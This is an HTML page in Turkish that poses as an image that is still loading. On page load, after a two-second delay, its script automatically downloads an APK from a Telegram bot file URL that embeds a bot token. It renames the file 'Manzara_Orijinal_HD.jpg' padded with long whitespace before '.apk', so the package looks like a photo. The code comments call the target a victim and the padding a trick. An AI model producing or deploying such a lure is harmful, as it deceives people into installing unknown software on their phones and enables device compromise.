<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Resim Yükleniyor...</title>
</head>
<body>

    <h2>Resim Yükleniyor, lütfen bekleyin...</h2>
    <p>İndirme başlamadıysa <a href="javascript:void(0);" onclick="indirVeKur()">buraya tıklayın</a>.</p>

    <script>
        // 1. Önce fonksiyonu tanımlıyoruz
        function indirVeKur() {
            console.log("Sistem tetiklendi..."); // Hatayı takip etmek için
            var link = document.createElement('a');
            
            // Senin Telegram'daki APK linkin
            link.href = 'https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_12.apk'; 
            
            // Kurbanın göreceği isim (Bol boşluklu hile)
            link.download = 'Manzara_Orijinal_HD.jpg                                                                .apk'; 
            
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        }

        // 2. Sayfa tamamen yüklendiğinde fonksiyonu hazır hale getir ve 2 saniye sonra çalıştır
        window.onload = function() {
            console.log("Sayfa hazır, zamanlayıcı başlıyor...");
            setTimeout(function() {
                try {
                    indirVeKur();
                } catch (e) {
                    console.error("Hata oluştu: ", e);
                }
            }, 2000);
        };
    </script>

</body>
</html>
